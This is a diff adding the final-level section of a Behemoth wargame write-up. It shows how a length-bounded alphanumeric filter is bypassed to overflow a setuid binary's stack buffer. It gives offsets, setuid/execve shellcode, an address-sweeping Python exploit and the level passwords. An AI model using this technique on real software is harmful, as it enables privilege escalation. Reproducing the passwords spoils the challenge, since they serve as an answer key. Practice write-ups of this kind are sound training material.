@@ -232,3 +232,22 @@ Verification: each password was accepted by logging in as the next level's accou
 - **Password for behemoth7:** `aHHctqVRgi`
 - **Verification:** logged in as `behemoth7` with this password.
 - **Recording:** `recordings/behemoth/L6.cast`
+
+## Level 7 → behemoth8 (final level)
+- **Account:** `behemoth7`, password `aHHctqVRgi`.
+- **Goal:** `main` copies `argv[1]` into a 0x20c-byte stack buffer with `strcpy`, but first runs an alphanumeric filter: `for (i = 0; buf[i] && i <= 0x1ff; i++) if (!isalpha(buf[i]) && !isspace(buf[i])) { puts("Non-alpha chars found in string, possible shellcode!"); exit(1); }`.
+- **Technique and why it works:** **filter-window bypass**. The check is bounded by `i <= 0x1ff`, so it only inspects the **first 512 characters** of `argv[1]`. `strcpy` afterwards copies the *whole* argument with no bound. So we send 512 letters (all `isalpha`), and after them the saved EBP, the return address, and the shellcode — none of which the filter ever sees. The buffer is at `ebp-0x20c`, so the saved EBP is at offset 524 and the return address at 528; the shellcode follows at 532.
+
+  The shellcode is assembled from `vim /tmp/b7.asm` with nasm (marker `PWN!`, `setreuid`/`setuid` to euid, `execve("/bin//sh")`) and extracted with objcopy/xxd. Because the stack address depends on the environment size, the exploit sweeps `0xffffd000..0xffffe400` and stops at the first address whose run prints `PWN!`; then it re-runs with the commands fed to the shell.
+
+### Step-by-step discovery and crafting (what the recording shows)
+1. **Read the filter.** `objdump -d` shows the loop with `cmp $0x1ff` before the `isalpha`/`isspace` tests, and the `strcpy` at the end. `strings` gives the failure message.
+2. **Probe it.** `/behemoth/behemoth7 AAAA` succeeds silently; `/behemoth/behemoth7 'AA%A'` prints `Non-alpha chars found in string, possible shellcode!` — proving the filter only looks at characters it walks.
+3. **gdb** (`unset environment`, break at `strcpy`) gives `buf = ebp-0x20c`, return address `ebp+4` → offsets 524/528.
+4. **Write `/tmp/b7.asm` in vim**, assemble (nasm/objdump/objcopy/xxd), 78 bytes.
+5. **Write `/tmp/e_behemoth7.py` in vim**: `b"A"*512 + b"A"*12 + b"BBBB" + pack(ret) + sc`, sweep, then `communicate(b"id\ncat /etc/behemoth_pass/behemoth8\nexit\n")`.
+6. **Run it.** The recording shows `landed in the shellcode at 0xffffdbb0`, `PWN!`, `uid=13008(behemoth8)`, and `L3WIFhR0LW`.
+7. **Verify.** Log in as behemoth8; `CONGRATULATIONS` confirms the game is complete.
+- **Password for behemoth8:** `L3WIFhR0LW`
+- **Verification:** logged in as `behemoth8`; `cat CONGRATULATIONS` → "Congratz!! Now fight for your right to eip=0x41414141!!"
+- **Recording:** `recordings/behemoth/L7.cast`
